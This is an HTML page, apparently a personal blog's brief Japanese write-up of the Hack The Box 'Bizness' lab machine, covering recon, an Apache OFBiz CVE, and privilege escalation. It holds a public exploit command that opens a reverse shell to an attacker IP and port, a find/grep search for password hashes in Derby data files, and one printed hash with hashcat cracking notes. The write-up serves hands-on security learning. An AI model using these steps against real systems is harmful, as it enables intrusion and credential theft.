@@ -1,0 +1,238 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB: Bizness // お茶は綾鷹派</title>
+    <link rel="shortcut icon" href="../../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.117.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="KoheiDoi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../css/main.min.3fb9065bb18f896621f7ce2fad5bbbafdf9954fbe571b5e41c6e59a8cbacc8ef.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB: Bizness"/>
+<meta name="twitter:description" content="user nmap ssh, http, ssl/http あたり http アクセスでサイトが立ち上がる ffuf /control OFBiz らしい こういうのはまず公式サイトから構成を簡単にさらう OFBiz Registered User が見つかる 下にバージョンが書いてある HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz CVE CVE が刺さる python3 ofbiz_exploit.py https://bizness.htb shell IP:4444 shell shell に入れた /home/ofbiz/user.txt root sudo -l 無理でした Derby /opt/ofbiz に色々インストールされてる config を見ると SHA が ~ とかいろいろ書かれている ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties derby に関するファイルを探す /opt/ofbiz/runtime/data/derby 列挙すると seg0 に .dat がたくさん入ってる find . -type f -name “*.dat” -exec grep “SHA” {} \; c5490."/>
+
+    <meta property="og:title" content="HTB: Bizness" />
+<meta property="og:description" content="user nmap ssh, http, ssl/http あたり http アクセスでサイトが立ち上がる ffuf /control OFBiz らしい こういうのはまず公式サイトから構成を簡単にさらう OFBiz Registered User が見つかる 下にバージョンが書いてある HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz CVE CVE が刺さる python3 ofbiz_exploit.py https://bizness.htb shell IP:4444 shell shell に入れた /home/ofbiz/user.txt root sudo -l 無理でした Derby /opt/ofbiz に色々インストールされてる config を見ると SHA が ~ とかいろいろ書かれている ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties derby に関するファイルを探す /opt/ofbiz/runtime/data/derby 列挙すると seg0 に .dat がたくさん入ってる find . -type f -name “*.dat” -exec grep “SHA” {} \; c5490." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://side-realms.github.io/writeup/htb_bizness/" /><meta property="article:section" content="writeup" />
+<meta property="article:published_time" content="2024-06-05T04:49:04+09:00" />
+<meta property="article:modified_time" content="2024-06-05T04:49:04+09:00" />
+
+    <style>
+      .hr1 {
+  position: relative;
+	height: 3px;
+	border-width: 0;
+	background-color: #00bcd4;
+	background-image: -webkit-linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+	background-image: linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+}
+    </style>
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://side-realms.github.io"><img class="app-header-avatar" src="../../images/avatar.jpg" alt="KoheiDoi" /></a>
+      <span class="app-header-title">お茶は綾鷹派</span>
+      <p>最近は颯も好き</p>
+      <p><font size="1">内容の正確性は保証していません🐶</font></p>
+      <nav class="app-header-menu">
+          <font size="5">
+          <a class="app-header-menu-item" href="../../">Home</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../log">life log</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../treasure/">treasure trove</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <nav class="app-header-menu">
+          <font size="4">
+          <a class="app-header-menu-item" href="../../sound">sound</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../container">container</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../hardware">hardware</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../writeup">writeup</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../other">other</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <div class="app-header-social">
+        
+          <a href="https://github.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+      <div class="app-footer-copyright">
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB: Bizness</h1>
+      </style>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 5, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          1 min read
+        </div>
+      </div>
+      <hr>
+    </header>
+    <div class="post-content">
+      <h2 id="user">user</h2>
+<ul>
+<li>nmap
+<ul>
+<li>ssh, http, ssl/http あたり</li>
+<li>http アクセスでサイトが立ち上がる</li>
+</ul>
+</li>
+<li>ffuf
+<ul>
+<li>/control</li>
+<li>OFBiz らしい</li>
+<li>こういうのはまず公式サイトから構成を簡単にさらう</li>
+</ul>
+</li>
+<li>OFBiz
+<ul>
+<li>Registered User が見つかる</li>
+<li>下にバージョンが書いてある</li>
+<li>HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある</li>
+<li><a href="">https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz</a></li>
+</ul>
+</li>
+<li>CVE
+<ul>
+<li>CVE が刺さる</li>
+<li><code>python3 ofbiz_exploit.py https://bizness.htb shell IP:4444</code></li>
+</ul>
+</li>
+<li>shell
+<ul>
+<li>shell に入れた</li>
+<li>/home/ofbiz/user.txt</li>
+</ul>
+</li>
+</ul>
+<h2 id="root">root</h2>
+<ul>
+<li><code>sudo -l</code>
+<ul>
+<li>無理でした</li>
+</ul>
+</li>
+<li>Derby
+<ul>
+<li>/opt/ofbiz に色々インストールされてる</li>
+<li>config を見ると SHA が ~ とかいろいろ書かれている
+<ul>
+<li><code>ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties</code></li>
+</ul>
+</li>
+<li>derby に関するファイルを探す
+<ul>
+<li><code>/opt/ofbiz/runtime/data/derby</code></li>
+</ul>
+</li>
+<li>列挙すると seg0 に .dat がたくさん入ってる</li>
+<li><code>find . -type f -name “*.dat” -exec grep “SHA” {} \;</code></li>
+<li><code>c5490.dat</code> がそれっぽいので見る
+<ul>
+<li><code>currentPassword=&quot;$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code></li>
+</ul>
+</li>
+<li>これをクラックすればいいんだが全然できない</li>
+</ul>
+</li>
+<li>ハッシュクラック
+<ul>
+<li>writeup を見るとどうやら base64 でエンコードされているらしい</li>
+<li>base64 -&gt; hashcat で解読する</li>
+<li>root パスワードで su root</li>
+<li>root.txt</li>
+</ul>
+</li>
+</ul>
+<p>base64 エンコードが全然できなかった．．．
+公式ドキュメントを見るとそれっぽいことが書いてあったからこれは調査不足だ．．．</p>
+
+    </div>
+    <div class="post-footer">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css" integrity="sha384-dbVIfZGuN1Yq7/1Ocstc1lUEm+AT+/rCkibIcC/OmWo5f0EA48Vf8CytHzGrSwbQ" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js" integrity="sha384-2BKqo+exmr9su6dir+qCw08N2ZKRucY4PrGQPPWU1A7FtlCGjmEGFqXCv5nyM5Ij" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}]
+    });
+  });
+</script>
+      
+    </div>
+  </article>
+  <hr>
+  <p>© side-realms All rights reserved.</p>
+
+    </main>
+  </body>
+</html>
